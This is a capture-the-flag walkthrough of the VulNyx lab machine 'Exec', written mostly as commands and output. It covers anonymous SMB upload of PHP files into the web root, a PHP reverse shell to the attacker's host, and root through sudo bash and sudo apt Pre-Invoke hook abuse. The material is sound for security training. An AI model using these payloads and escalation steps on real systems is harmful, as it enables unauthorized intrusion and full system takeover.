# Exec

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Exec | d4t4s3c | Low | VulNyx |

**Summary:** The Exec machine is a Samba centric box that turns a misconfigured file share into a full compromise. TCP scans exposed SSH, an Apache instance, and Samba on ports 139 and 445, with the NetBIOS name EXEC advertising the host. Anonymous SMB access listed a share called `server`, described as a Developer Directory, which turned out to map directly onto the Apache web root at `/var/www/html`. The share was world writable, so the attacker uploaded a trivial PHP file straight into the document root and fetched it over HTTP, where PHP 8.2.7 executed it and handed back a reverse shell as the www-data user. A quick sudo audit revealed that www-data could run `/usr/bin/bash` as the user s3cur4 without a password, granting the first user shell and the flag inside the home directory. The same sudo policy repeated itself one level up, because s3cur4 could execute `/usr/bin/apt` as root without authentication. The apt package manager honors APT configuration hooks, and the `APT::Update::Pre-Invoke` option executes an arbitrary command before an update run, so pointing it at `/bin/sh` spawned a privileged shell on the spot. Both the user flag and the root flag were recovered, completing the box through nothing more than an open writeable share and two overly generous sudo rules.

---

## Reconnaissance

The engagement opened with a host discovery sweep, followed by service scans.

1. A new host appeared on the lab network at `192.168.56.131`:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -sn 192.168.56.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 07:10 -0400
Nmap scan report for 192.168.56.131 (192.168.56.131)
MAC Address: 08:00:27:81:C3:22 (Oracle VirtualBox virtual NIC)

┌──(kali㉿kali)-[~/nyx]
└─$ ip=192.168.56.131
```

2. A full port scan exposed four TCP services:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ nmap -p- -sC -sV -T4 $ip -oN nmap_exec.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-19 07:10 -0400
Nmap scan report for 192.168.56.131 (192.168.56.131)
Host is up (0.00015s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey:
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp  open  http        Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:81:C3:22 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: EXEC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time:
|   date: 2026-08-19T11:11:09
|_  start_date: N/A
|_clock-skew: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.57 seconds
```

3. The web server was fetched and returned the stock Apache 2 Debian landing page:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ curl -s -i http://$ip/ | head -20
HTTP/1.1 200 OK
Date: Wed, 19 Aug 2026 11:11:18 GMT
Server: Apache/2.4.57 (Debian)
Last-Modified: Mon, 15 Apr 2024 08:04:31 GMT
ETag: "29cd-6161e124a0a03"
Accept-Ranges: bytes
Content-Length: 10701
Content-Type: text/html

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Debian Default Page: It works</title>
```

4. The SMB service answered an anonymous share listing:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ smbclient -L //$ip/ -N
smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	server          Disk      Developer Directory
	IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
	nobody          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 192.168.56.131 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

The `server` share, labeled Developer Directory, stood out. The `nobody` share, intended for home directories, refused anonymous access, but `server` appeared worth a closer look.

---

## Initial Access

### A World Writable Web Root

5. The `server` share was mounted anonymously and inspected:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ smbclient //$ip/server -N -c 'ls -la; recurse; ls'
  .                                   D        0  Mon Apr 15 04:45:54 2024
  ..                                  D        0  Mon Apr 15 04:04:12 2024
  index.html                          N    10701  Mon Apr 15 04:04:31 2024

		19480400 blocks of size 1024. 16499348 blocks available
```

The share held a single file, `index.html`, exactly 10701 bytes, the same size as the Apache default page served on port 80. That meant the share almost certainly mapped onto the web document root, and the directory listing confirmed the hypothesis once the shell was won.

6. The write permission on the share was tested by uploading a harmless PHP probe, then fetching it over HTTP:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ echo '<?php echo "RCE_TEST ".phpversion(); ?>' > test.php
┌──(kali㉿kali)-[~/nyx]
└─$ smbclient //$ip/server -N -c 'put test.php'
putting file test.php as \test.php (13.0 kB/s) (average 13.0 kB/s)

┌──(kali㉿kali)-[~/nyx]
└─$ curl -s http://$ip/test.php
RCE_TEST 8.2.7
```

The share was world writable, PHP 8.2.7 was enabled on the web server, and the uploaded file executed on the first request. That combination is a complete remote code execution primitive.

### Reverse Shell as www-data

7. A reverse shell listener was prepared on port 4444, and a one line PHP payload was uploaded:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ cat rev.php
<?php system('bash -c "bash -i >& /dev/tcp/192.168.56.104/4444 0>&1"'); ?>
```

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ smbclient //$ip/server -N -c 'put rev.php'
putting file rev.php as \rev.php (36.6 kB/s) (average 36.6 kB/s)
```

8. Requesting the payload over HTTP blocked the connection as expected, because the shell had grabbed the process. On the listener the connection appeared:

```bash
┌──(kali㉿kali)-[~/nyx]
└─$ cat /tmp/handler_status.txt
listening on 4444
connection from ('192.168.56.131', 33874)
ready: write commands to /tmp/cmds.txt
```

9. The shell landed as the www-data user on a host named exec:

```bash
www-data@exec:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@exec:/var/www/html$ hostname
exec
www-data@exec:/var/www/html$ ls -la /home
total 12
drwxr-xr-x  3 root   root   4096 Apr 15  2024 .
drwxr-xr-x 18 root   root   4096 Apr 15  2024 ..
drwx------  3 s3cur4 s3cur4 4096 Apr 15  2024 s3cur4
```

The web root confirmed the Samba mapping, since the uploaded `rev.php` and `test.php` were visible right next to `index.html`, owned by the same www-data user that owned the directory.

---

## Lateral Movement

### Shell as s3cur4

10. The sudo policy for www-data exposed the first horizontal move:

```bash
www-data@exec:/var/www/html$ sudo -l
Matching Defaults entries for www-data on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on exec:
    (s3cur4) NOPASSWD: /usr/bin/bash
```

The web user was allowed to spawn `/usr/bin/bash` as s3cur4 without any password.

11. The rule was exercised, and the shell became s3cur4:

```bash
www-data@exec:/var/www/html$ sudo -u s3cur4 /usr/bin/bash
s3cur4@exec:/var/www/html$ id
uid=1000(s3cur4) gid=1000(s3cur4) groups=1000(s3cur4)
s3cur4@exec:/var/www/html$ whoami
s3cur4
```

12. The home directory of s3cur4 held the user flag:

```bash
s3cur4@exec:/var/www/html$ ls -la /home/s3cur4
total 28
drwx------ 3 s3cur4 s3cur4 4096 Apr 15  2024 .
drwxr-xr-x 3 root   root   4096 Apr 15  2024 ..
lrwxrwxrwx 1 root   root      9 Apr 15  2024 .bash_history -> /dev/null
-rw-r--r-- 1 s3cur4 s3cur4  220 Nov 15  2023 .bash_logout
-rw-r--r-- 1 s3cur4 s3cur4 3526 Nov 15  2023 .bashrc
drwxr-xr-x 3 s3cur4 s3cur4 4096 Apr 15  2024 .local
-rw-r--r-- 1 s3cur4 s3cur4  807 Nov 15  2023 .profile
-r-------- 1 s3cur4 s3cur4   33 Apr 15  2024 user.txt

s3cur4@exec:/var/www/html$ cat /home/s3cur4/user.txt
```

---

## Privilege Escalation

### Root Through the apt Pre-Invoke Hook

13. The sudo policy for s3cur4 exposed the root primitive:

```bash
s3cur4@exec:/var/www/html$ sudo -l
Matching Defaults entries for s3cur4 on exec:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User s3cur4 may run the following commands on exec:
    (root) NOPASSWD: /usr/bin/apt
```

The user could run `/usr/bin/apt` as root without a password. The apt package manager executes arbitrary commands through APT configuration hooks, and the `APT::Update::Pre-Invoke` option runs a given command before an update operation. Pointing that hook at `/bin/sh` produces a root shell the moment an update is requested.

14. The command was executed, and the pre-invoke hook opened a privileged shell:

```bash
s3cur4@exec:/var/www/html$ sudo /usr/bin/apt update -o APT::Update::Pre-Invoke::=/bin/sh
WARNING: apt does not have a stable CLI interface. Use with caution in scripts.

# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
```

15. With root privileges confirmed, the root flag was recovered:

```bash
# ls -la /root
total 28
drwx------  4 root root 4096 Apr 15  2024 .
drwxr-xr-x 18 root root 4096 Apr 15  2024 ..
lrwxrwxrwx  1 root root    9 Apr 15  2024 .bash_history -> /dev/null
-rw-r--r--  1 root root 3526 Apr 15  2024 .bashrc
drwxr-xr-x  3 root root 4096 Apr 15  2024 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwx------  2 root root 4096 Apr 15  2024 .ssh
-r--------  1 root root   33 Apr 15  2024 root.txt

# cat /root/root.txt
```

16. The uploaded payloads were removed from the web root to restore the machine to its original state:

```bash
# rm -f /var/www/html/rev.php /var/www/html/test.php
# ls /var/www/html
index.html
```

---

## Attack Chain Summary

1. **Reconnaissance**: A host discovery sweep isolated the target at `192.168.56.131`, and a full port scan exposed SSH on port 22, Apache on port 80, and Samba on ports 139 and 445, with the NetBIOS name EXEC. The web server offered only the stock Apache landing page.

2. **Vulnerability Discovery**: Anonymous SMB access enumerated a share named `server` labeled Developer Directory, which contained a single `index.html` file identical in size to the Apache default page, revealing that the share mapped onto the web document root.

3. **Exploitation**: The share was world writable, so a PHP payload was uploaded straight into the web root and requested over HTTP, where PHP 8.2.7 executed it and delivered a reverse shell as the www-data user.

4. **Internal Enumeration**: A sudo audit showed that www-data could run `/usr/bin/bash` as the user s3cur4 without a password, producing the first user shell and the user flag. A second sudo rule then allowed s3cur4 to run `/usr/bin/apt` as root.

5. **Privilege Escalation**: The apt package manager was invoked with the `APT::Update::Pre-Invoke` hook set to `/bin/sh`, executing a command as root before the update ran and spawning a privileged shell. The root flag was recovered from /root/root.txt, completing the compromise.